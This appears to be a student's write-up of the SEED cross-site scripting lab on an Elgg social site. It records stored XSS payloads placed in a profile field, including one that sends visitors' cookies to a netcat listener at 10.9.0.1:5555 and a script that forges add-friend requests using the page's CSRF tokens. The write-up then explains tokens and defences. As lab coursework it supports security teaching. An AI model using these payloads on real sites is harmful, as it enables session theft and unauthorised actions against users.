# Question 1
## Task 1

First we logged in ```http://www.seed-server.com/```with the user ```alice``` and the corresponding password - ```seedalice```.
Then, in the profile page, we edit the ```Brief description``` to ```<script>alert(’XSS’);</script>```.

![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task1_logbook7.png)

After making that change, when any user visits that profile, that code will be executed and an alert window will be displayed.

![Image 2.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task1_logbook7_2.png)

## Task 2

 We changed the  ```Brief description``` to ```<script>alert(document.cookie);</script>```.

 ![Image 3.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7.png)

 After making the change, when viewing the profile, an alert window was displayed showing the cookies of the user who viewed the profile.

 - Login as ```alice```:
  ![Image 4.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7_2.png)
 - Login as ```boby```:
   ![Image 5.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7_3.png)

## Task 3
 We changed the  ```Brief description``` to ```<script>document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’);</script>```.
![Image 6.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task3_logbook7.png)
   Then we used the command ```nc -lknv 5555```to start a server that listens on port 5555, then we visited ```alice```'s profile logged as ```alice``` and then logged as ```boby```:
![Image 7.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task3_logbook7_1.png)
    That way, as the attacker, we were able to see the users' cockies.

## Task 4
We started by going to the ```samy```profile logged as ```alice```. We inspected it to find out what is sent to the server when a user adds a friend:
![Image 8.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7.png)
Then we completed the following code with the request to add ```samy```as friend, that we had discovered:
```<script type="text/javascript">
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```
We logged as ```samy``` and  changed the ```Brief description```to that code:

![Image 9.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7_1.png)

After that we logged as ```alice``` and checked her friends:

![Image 10.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7_2.png)

We visited the ```samy```profile:
![Image 11.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7_3.png)
Then reloaded the page, and suddently ```alice```become friends with ```samy```:
![Image 12.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7_4.png)
![Image 13.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task4_logbook7_5.png)

### Question 1

Lines ➀ and ➁ are used to dynamically extract CSRF tokens that ensure requests to the server are legitimate and originate from an authenticated session. The ```__elgg_ts``` and ```__elgg_token``` are security tokens that prevent malicious users from forging requests on behalf of a victim. These tokens are typically unique per session, and by including them in the request, the server can verify that the request comes from an authorized user and not from a malicious script.

- Line ➀: This fetches the ```__elgg_ts``` token from the Elgg framework’s security object ```elgg.security.token.__elgg_ts```. It represents a timestamp value to prevent replay attacks.
- Line ➁: This fetches the ```__elgg_token``` token from the same security object ```elgg.security.token.__elgg_token```. It acts as a unique session identifier for preventing CSRF attacks.

Both of these tokens are crucial for the integrity of the request and ensure that the action being taken (such as adding a friend) is authorized.

### Question 2

If the Elgg application only provides the Editor mode and does not allow switching to the Text mode, it can make it more challenging to launch an XSS attack. The Editor mode typically uses a rich-text editor that sanitizes user input to prevent the inclusion of dangerous HTML tags or JavaScript, which is often a barrier to XSS attacks.

However, it may still be possible to launch an attack under certain conditions:

- If the editor doesn't properly sanitize all input or allows certain HTML tags, a malicious script might still be injected through certain mechanisms (like embedding an image or a link that contains a payload).

- If there are flaws in how the application handles the input from the editor (such as improper encoding or filtering), a malicious actor might be able to inject malicious code without requiring access to the Text mode.

In summary, while the restriction to Editor mode makes it harder for attackers to directly insert JavaScript code, it does not completely eliminate the possibility of an XSS attack if the application doesn't implement strong input sanitization and output encoding.

# Question 2
The described attack can be classified as a Stored XSS attack because the malicious code is inserted into the ```Brief description``` of the user's profile. Once stored on the server, it will be executed every time someone else accesses that user's profile, without requiring direct interaction from the victim - the malicious script persists on the site and is executed each time that user's profile is accessed.

# Conclusion
This series of tasks highlights the risks of XSS and CSRF vulnerabilities. By injecting malicious scripts into user profiles, we demonstrated how attackers can steal sensitive data and manipulate user actions without direct interaction. It emphasizes the need for strong input sanitization, output encoding, and CSRF protection to prevent such attacks and secure web applications effectively.
